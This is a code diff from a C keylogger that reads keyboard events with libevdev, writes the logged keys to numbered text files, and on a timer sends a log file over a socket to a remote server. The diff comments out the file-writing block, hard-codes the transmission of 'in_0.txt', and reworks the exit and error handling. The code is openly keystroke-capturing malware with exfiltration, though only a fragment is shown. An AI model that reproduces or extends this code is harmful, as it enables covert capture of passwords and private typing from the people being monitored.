@@ -112,39 +112,47 @@ int main(void) {
       printf("Unsure of what is going on here..\n");
     }
 
+    // If the counter is equal to the timer, send data
     if (counter == timer_counter) {
       counter = 0;
-      // read and write and whee
+      // // read and write and whee
+      // // convert int to str
+      // print_logged_keys(*package);
+      // char str[20];
+      // sprintf(str, "in_%d", file_name_counter);
+      // char* file_name = strcat(str, ".txt");
+      // FILE* package_log = fopen(file_name, "w");
+      // if (package_log == NULL) {
+      //   error_and_exit("Couldn't open package log");
+      // }
+      // keys_to_file(package_log, *package);
 
-      // convert int to str
-      print_logged_keys(*package);
-      char str[20];
-      sprintf(str, "in_%d", file_name_counter);
-      char* file_name = strcat(str, ".txt");
-      FILE* package_log = fopen(file_name, "w");
-      if (package_log == NULL) {
-        error_and_exit("Couldn't open file");
+      // // call send data functoin on package_log
+      // if (package->keys_arr_size != 0) {
+      //   reset_structs(package);
+      // }
+      // ++file_name_counter;
+
+      // FILE* read_log = fopen("in_0.txt", "r");
+      // puts(file_name);
+      if (send_data(socket_file, "in_0.txt") != 0) {
+        error_and_exit("what is the point");
       }
-      keys_to_file(package_log, *package);
-      // call send data functoin on package_log
-
-      if (package->keys_arr_size != 0) {
-        reset_structs(package);
-      }
-      ++file_name_counter;
-
-      FILE* read_log = fopen(file_name, "r");
-      send_data(socket_file, read_log);
-
-      fclose(package_log);
+      // fclose(package_log);
+      // fclose(read_log);
     }
 
+    // EXIT with F12
     if (ev.code == 107) {
       // if (log_indicator == 0) {
-      printf("\nExiting.\n");
-
-      break;
+      error_and_exit("Exiting");
     }
+  }
+
+  // If we didn't hit the end of file for either stdin or the response from the
+  // server, then something went wrong.
+  if (!feof(stdin) && !feof(socket_file)) {
+    error_and_exit("Error reading or writing line:");
   }
   // Clean up
   libevdev_free(keyboard_dev);
